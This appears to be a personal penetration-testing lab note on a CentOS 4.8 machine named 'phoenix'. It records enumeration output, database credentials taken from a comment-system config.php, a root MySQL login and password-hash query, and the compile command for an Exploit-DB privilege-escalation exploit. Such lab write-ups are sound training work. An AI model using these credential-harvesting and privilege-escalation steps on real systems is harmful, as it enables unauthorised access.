* Hostname: **phoenix**
* Web Server: **Apache/2.0.52 (CentOS)**
* Programming Language: **PHP 4.3.9**

```
Linux version 2.6.9-89.EL (mockbuild@builder10.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-11)) #1 Mon Jun 22 12:19:40 EDT 2009
LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID: CentOS
Description:    CentOS release 4.8 (Final)
Release:        4.8
Codename:       Final
```


```
uname -a
Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 athlon i386 GNU/Linux
```

**SMB**
```
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.33-0.17.el4)
|   Computer name: phoenix
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: phoenix
|_  System time: 2023-01-27T02:41:21-05:00
```

**config.php**
```
#/var/www/html/internal/advanced_comment_system/config.php

/* ######################## DATABASE ######################## */
  // Database server
  $ACS_CONFIG["db_server"] = "localhost";  
  // Database name
  $ACS_CONFIG["db_name"] = "acs";  
  // Database username
  $ACS_CONFIG["db_user"] = "root";
  // Database password
  $ACS_CONFIG["db_password"] = "aCs2009offsec";  
  // Database table to store comments
  // (will be created automatically)
  $ACS_CONFIG["db_table"] = "advanced_comment_system";
  // Admin Password
  $ACS_CONFIG["admin_password"] = "admin";             
                                                     
/* ##################### CONFIGURATION ###################### */
  $ACS_CONFIG["admin_password"] = "admin";
```

```shell
$ mysql -u root -paCs2009offsec -h 127.0.0.1
```

```SQL
SELECT password from USER WHERE user = 'root';
```

```
189c6ace38ba2318
```
![[10.11.1.8 - phoenix (done)/screenshots/db-root-password.png]]

```
# exploit: https://www.exploit-db.com/exploits/9542
gcc -m32 -Wl,--hash-style=both -o exploit 9542.c
```

![[phoenix-proof.png]]
